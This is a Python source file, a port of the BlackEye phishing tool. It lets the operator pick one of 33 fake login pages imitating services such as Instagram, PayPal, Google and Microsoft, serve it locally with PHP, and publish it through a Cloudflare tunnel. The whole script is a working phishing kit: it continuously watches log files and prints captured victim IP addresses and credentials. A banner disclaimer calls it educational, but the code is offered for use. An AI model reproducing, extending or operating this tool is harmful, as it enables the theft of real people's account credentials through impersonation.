import os
import sys
import subprocess
import re
import time

class colors:
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    END    = '\33[0m'

# Function to check if required commands exist
def check_dependencies():
    required_cmds = ["php", "cloudflared"]
    for cmd in required_cmds:
        if subprocess.call(f"which {cmd} > /dev/null 2>&1", shell=True) != 0:
            print(colors.RED + f"Error: {cmd} is not installed. Install it and try again." + colors.END)
            sys.exit(1)

# Function to track log files and display captured data
def track_logs(ip_path, user_path):
    """ Continuously monitors IP and usernames log files """
    print(colors.GREEN + f"\n[+] Monitoring {ip_path} and {user_path}..." + colors.END)

    seen_ips = set()
    seen_users = set()

    while True:
        # Monitor IP logs
        if os.path.exists(ip_path):
            with open(ip_path, "r") as f:
                lines = f.readlines()
                for line in lines:
                    line = line.strip()
                    if line and line not in seen_ips:
                        seen_ips.add(line)
                        print(colors.YELLOW + "[+] Captured IP: " + colors.END + line)

        # Monitor credential logs
        if os.path.exists(user_path):
            with open(user_path, "r") as f:
                lines = f.readlines()
                for line in lines:
                    line = line.strip()
                    if line and line not in seen_users:
                        seen_users.add(line)
                        print(colors.RED + "[+] Captured Credentials: " + colors.END + line)

        time.sleep(2)  # Check every 2 seconds

try:
    print(colors.RED + """
                        BlackEye Python

Original Shell Program Created By thelinuxchoice
Link to Original: https://github.com/thelinuxchoice/blackeye

Differences:
    - This is written in Python
    - Uses Cloudflare Tunnel instead of Serveo

                        :: DISCLAIMER ::

I nor the original developers take any responsibility for actions caused
by using this program. Any misuse or damage caused by BlackEye is on the
user's behalf. Use for EDUCATIONAL PURPOSES!
    """ + colors.END)

    print(colors.GREEN + """
                       Available Templates

[1] Instagram          [2] Facebook            [3] Snapchat
[4] Twitter            [5] GitHub              [6] Google
[7] Spotify            [8] Netflix             [9] PayPal
[10] Origin            [11] Steam              [12] Yahoo!
[13] LinkedIn          [14] Protonmail         [15] Wordpress
[16] Microsoft         [17] IGFollowers        [18] eBay (Not Available)
[19] Pinterest         [20] CryptoCurrency     [21] Verizon
[22] DropBox           [23] Adobe ID           [24] Shopify
[25] FB Messenger      [26] GitLab             [27] Twitch
[28] MySpace           [29] Badoo              [30] VK
[31] Yandex            [32] devianART          [33] Custom

Please Choose A Number To Host Template:
    """ + colors.END)

    templates = {
        '1': 'instagram', '2': 'facebook', '3': 'snapchat', '4': 'twitter',
        '5': 'github', '6': 'google', '7': 'spotify', '8': 'netflix', '9': 'paypal',
        '10': 'origin', '11': 'steam', '12': 'yahoo', '13': 'linkedin', '14': 'protonmail',
        '15': 'wordpress', '16': 'microsoft', '17': 'igfollowers', '18': 'ebay',
        '19': 'pinterest', '20': 'cryptocurrency', '21': 'verizon', '22': 'dropbox',
        '23': 'adobeid', '24': 'shopify', '25': 'fbmessenger', '26': 'gitlab', '27': 'twitch',
        '28': 'myspace', '29': 'badoo', '30': 'vk', '31': 'yandex', '32': 'devianart', '33': 'create'
    }

    number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ").strip()

    # Validate input
    if number not in templates:
        print(colors.RED + "Invalid selection. Please enter a valid number." + colors.END)
        sys.exit(1)
    if number == "18":
        print(colors.RED + "Ebay Currently Does Not Work. Choose Another." + colors.END)
        sys.exit(1)

    choice = templates[number]
    print(f"[+] Loading {choice} phishing site...")

    # Get subdomain name from user
    print("\nEnter A Custom Subdomain (Optional, press Enter to skip)")
    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ").strip()

    # Validate subdomain (only letters, numbers, dashes, and underscores allowed)
    if subdom and not re.match(r"^[a-zA-Z0-9_-]+$", subdom):
        print(colors.RED + "Invalid subdomain. Use only letters, numbers, dashes, or underscores." + colors.END)
        sys.exit(1)

    print(colors.GREEN + "Starting Server at 127.0.0.1:80..." + colors.END)
    print(f"Logs Can Be Found In sites/{choice}/ip.txt and sites/{choice}/usernames.txt" + colors.END)

    # Check dependencies before running
    check_dependencies()

    # Start PHP Server
    php_cmd = f"php -t sites/{choice} -S 127.0.0.1:80 &"
    subprocess.Popen(php_cmd, shell=True)

    # Start Cloudflare Tunnel
    cf_cmd = "cloudflared tunnel --url http://127.0.0.1:80"
    if subdom:
        cf_cmd = f"cloudflared tunnel --hostname {subdom}.example.com --url http://127.0.0.1:80"

    subprocess.Popen(cf_cmd, shell=True)

    # Monitor captured credentials
    ip_path = f"sites/{choice}/ip.txt"
    user_path = f"sites/{choice}/usernames.txt"

    track_logs(ip_path, user_path)

except KeyboardInterrupt:
    print("\n[!] Exiting...")
    sys.exit(1)
